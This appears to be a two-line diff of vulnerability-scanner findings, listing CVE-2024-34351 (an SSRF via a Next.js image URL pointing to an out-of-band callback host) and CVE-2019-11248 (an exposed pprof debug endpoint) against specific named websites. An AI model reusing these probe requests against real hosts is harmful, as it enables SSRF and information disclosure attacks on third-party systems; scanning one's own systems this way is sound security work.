@@ -1,0 +1,2 @@
+[CVE-2024-34351] [http] [high] https://pro.teller.org/_next/image?w=16&q=10&url=https://d906rgno6j3jevsa0ekgac6o7t9dwgu16.oast.fun
+[CVE-2019-11248] [http] [high] https://quote.omni.apex.exchange/debug/pprof/
